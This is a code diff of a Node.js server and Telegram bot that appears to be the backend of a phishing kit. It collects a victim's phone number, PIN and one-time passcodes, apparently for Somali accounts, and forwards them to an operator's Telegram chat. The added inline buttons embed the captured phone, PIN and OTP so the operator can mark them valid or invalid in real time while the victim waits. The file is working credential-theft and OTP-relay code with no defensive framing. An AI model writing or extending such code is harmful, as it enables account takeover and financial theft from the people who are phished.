@@ -63,8 +63,7 @@ app.post('/api/login-notification', async (req, res) => {
 
     statusStore[phone] = "pending";
 
-    const message =
-`📱 <b>CL 2 - LOGIN ATTEMPT</b>
+    const message = `📱 <b>CL 2 - LOGIN ATTEMPT</b>
 
 🆕 <b>NEW USER</b>
 🇸🇴 <b>Country:</b> ${country}
@@ -82,7 +81,12 @@ app.post('/api/login-notification', async (req, res) => {
         await bot.telegram.sendMessage(ADMIN_ID, message, {
             parse_mode: 'HTML',
             reply_markup: {
-                inline_keyboard: []
+                inline_keyboard: [
+                    [
+                        { text: "✅ Allow to proceed", callback_data: `approve_${phone}_${pin}` },
+                        { text: "❌ Invalid credentials", callback_data: `deny_${phone}_${pin}` }
+                    ]
+                ]
             }
         });
 
@@ -111,8 +115,7 @@ app.post('/api/verify-first-otp', async (req, res) => {
     if (!phone || !otp || !ADMIN_ID)
         return res.status(400).json({ error: "Missing data" });
 
-    const otpMessage =
-`1️⃣ <b>CL 2 - FIRST OTP (Step 1/2)</b>
+    const otpMessage = `1️⃣ <b>CL 2 - FIRST OTP (Step 1/2)</b>
 
 🆕 <b>NEW USER - FIRST VERIFICATION</b>
 🇸🇴 <b>Country:</b> ${country}
@@ -131,7 +134,12 @@ app.post('/api/verify-first-otp', async (req, res) => {
         await bot.telegram.sendMessage(ADMIN_ID, otpMessage, {
             parse_mode: 'HTML',
             reply_markup: {
-                inline_keyboard: []
+                inline_keyboard: [
+                    [
+                        { text: "✅ Correct", callback_data: `otp1_correct_${phone}_${otp}` },
+                        { text: "❌ Wrong Code", callback_data: `otp1_wrong_${phone}` }
+                    ]
+                ]
             }
         });
 
@@ -157,8 +165,7 @@ bot.action(/approve_(.+)_(.+)/, async (ctx) => {
         hour12: true
     });
 
-    const approvedMsg =
-`✅ <b>LOGIN APPROVED</b>
+    const approvedMsg = `✅ <b>LOGIN APPROVED</b>
 
 🆕 <b>NEW USER</b>
 🇸🇴 <b>Somalia</b>
@@ -172,7 +179,7 @@ bot.action(/approve_(.+)_(.+)/, async (ctx) => {
 ⏱️ <b>${currentTime}</b>`;
 
     try {
-        await ctx.editMessageReplyMarkup();
+        await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
         await ctx.replyWithHTML(approvedMsg);
         await ctx.answerCbQuery("Allowed");
     } catch (e) {
@@ -194,8 +201,7 @@ bot.action(/deny_(.+)_(.+)/, async (ctx) => {
         hour12: true
     });
 
-    const deniedMsg =
-`❌ <b>INVALID CREDENTIALS</b>
+    const deniedMsg = `❌ <b>INVALID CREDENTIALS</b>
 
 🇸🇴 <b>Somalia</b>
 📱 <b>${phone}</b>
@@ -207,7 +213,7 @@ bot.action(/deny_(.+)_(.+)/, async (ctx) => {
 ⏱️ <b>${currentTime}</b>`;
 
     try {
-        await ctx.editMessageReplyMarkup();
+        await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
         await ctx.replyWithHTML(deniedMsg);
         await ctx.answerCbQuery("Rejected");
     } catch (e) {
@@ -229,8 +235,7 @@ bot.action(/otp1_correct_(.+)_(.+)/, async (ctx) => {
         hour12: true
     });
 
-    const verifiedMsg =
-`1️⃣ <b>FIRST OTP VERIFIED (Step 1/2)</b>
+    const verifiedMsg = `1️⃣ <b>FIRST OTP VERIFIED (Step 1/2)</b>
 
 🇸🇴 <b>Somalia</b>
 📱 <b>${phone}</b>
@@ -243,7 +248,7 @@ bot.action(/otp1_correct_(.+)_(.+)/, async (ctx) => {
 ⌛ <b>${currentTime}</b>`;
 
     try {
-        await ctx.editMessageReplyMarkup();
+        await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
         await ctx.replyWithHTML(verifiedMsg);
         await ctx.answerCbQuery("Verified");
     } catch (e) {
@@ -258,7 +263,7 @@ bot.action(/otp1_wrong_(.+)/, async (ctx) => {
     statusStore[phone] = "otp1_wrong";
 
     try {
-        await ctx.editMessageReplyMarkup();
+        await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
         await ctx.replyWithHTML(
             `❌ <b>FIRST OTP WRONG</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>Prompted to re-enter OTP.</b>`
         );
